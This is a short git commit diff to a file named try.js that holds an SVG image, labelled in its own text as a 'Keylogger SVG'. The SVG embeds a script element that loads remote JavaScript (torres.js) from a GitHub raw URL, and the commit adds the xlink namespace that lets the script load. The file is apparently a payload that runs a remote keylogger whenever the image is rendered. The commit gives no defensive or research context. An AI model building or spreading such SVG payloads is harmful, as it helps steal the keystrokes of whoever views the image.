c88871f410ae1a2feca29c12cf290952c25dd8b8
faridmslmv <135648587+faridmslmv@users.noreply.github.com>
2024-12-17 15:34:59 +0400

    Update try.js

--- try.js
+++ try.js
@@ -1,4 +1,6 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="100" height="100">
   <script xlink:href="http://raw.githubusercontent.com/faridmslmv/testxml/refs/heads/main/torres.js"></script>
   <text y="20">Keylogger SVG</text>
 </svg>
